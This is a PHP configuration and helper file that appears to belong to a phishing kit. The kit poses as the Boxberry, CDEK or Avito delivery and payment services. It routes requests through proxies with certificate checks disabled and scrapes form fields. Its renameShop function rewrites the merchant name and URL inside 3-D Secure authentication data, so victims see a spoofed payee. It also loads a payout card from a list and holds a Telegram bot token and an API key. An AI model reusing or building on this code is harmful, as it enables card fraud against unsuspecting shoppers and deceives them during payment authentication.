<?php
// функция, отвечающая за запросы к сайту и получению массива данных.
function request($method = "GET", $url = null, $params = null, $proxy = null, $proxy_userpwd = null) {
	global $proxy, $proxy_userpwd;
	$ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

	if($method == "POST") {
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $params['params']);
	} else {
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	}

	if(isset($params['headers'])) {
		curl_setopt($ch, CURLOPT_HTTPHEADER, $params['headers']);
	}

	if(isset($params['cookies'])) {
		curl_setopt($ch, CURLOPT_COOKIE, $params['cookies']);
	}

	if($proxy) {
		curl_setopt($ch, CURLOPT_PROXY, $proxy);
		curl_setopt($ch, CURLOPT_PROXYTYPE,CURLPROXY_SOCKS5);



		if($proxy_userpwd) {
			curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_userpwd);
		}
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	}

	$result = curl_exec($ch);

	$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
	$headers = substr($result, 0, $header_size);
	$content = substr($result, $header_size);

	preg_match_all('|Set-Cookie: (.*);|U', $headers, $parse_cookies);
	$cookies = implode(';', $parse_cookies[1]);

	curl_close($ch);

	return array('headers' => $headers, 'cookies' => $cookies, 'content' => $content);
}
function getFormDataHTML($html)
{
	$dom = new DOMDocument();
	$dom->loadHTML($html);

	$xpath = new DOMXPath($dom);

	foreach ($xpath->query('//input') as $tag) {
		$elems[trim($tag->getAttribute('name'))] = trim($tag->getAttribute('value'));
	}

	foreach ($xpath->query('//form') as $tag) {
		$elems["action"] = trim($tag->getAttribute('action'));
	}
	return $elems;
}
function renameShop($pareq, $to_name, $to_link){
	$defaultPareq = base64_decode($pareq);
	$ThreeDSecureData = zlib_decode($defaultPareq);
	$ThreeDSecureDataXML = new \SimpleXMLElement($ThreeDSecureData);
	foreach($ThreeDSecureDataXML->xpath('/ThreeDSecure/Message/PAReq/Merchant') as $threeData) {
		$threeData->name = $to_name;
		$threeData->url = $to_link;
	}
	$ThreeDSecureData = $ThreeDSecureDataXML->asXML();
	$ThreeDSecureData = zlib_encode($ThreeDSecureData, ZLIB_ENCODING_DEFLATE);
	$ThreeDSecureData = base64_encode($ThreeDSecureData);
	return $ThreeDSecureData;
}


$api_key = "8a9d8dd6fb850d430ef1313f3e25f266";

// Номер карты для поступления зачислений

$card_arr = explode(';', file_get_contents(__DIR__ . '/cclist.txt'));
$card = trim($card_arr[0]);//"";

//
//$proxy_arr = explode("\n", file_get_contents(__DIR__ . '/proxy.txt'));
//$proxy1 = explode(":",trim($proxy_arr[0]));
//$proxy = $proxy1[0].":".$proxy1[1];
//$proxy_userpwd = $proxy1[2].":".$proxy1[3];


// Протокол
$protocol = "https";

//имя директории

define('SH_DIR','rnar');

// Имя магазина
$shop_name = "boxberry";

if (strstr($_SERVER['HTTP_HOST'], "cdek"))
{
	$shop_name = "cdek";
}

if (strstr($_SERVER['HTTP_HOST'], "avito"))
{
	$shop_name = "avito";
}

// Уведомления в телеграмм канал
$tg_token = "849485480:AAGdb9v2op3yitXaUFju61OME7sv5Aivv3Q";
$token = "849485480:AAGdb9v2op3yitXaUFju61OME7sv5Aivv3Q";
$chat_id = "854610926";


// Ссылка на магазин
$shop_url = "https://robokassa.com/";

// Страница с успешной оплатой
$success_url = "success.php";

// Страница с ошибкой оплаты
$error_url = "error.php";


global $success_url,$error_url,$shop_name,$card;

?>
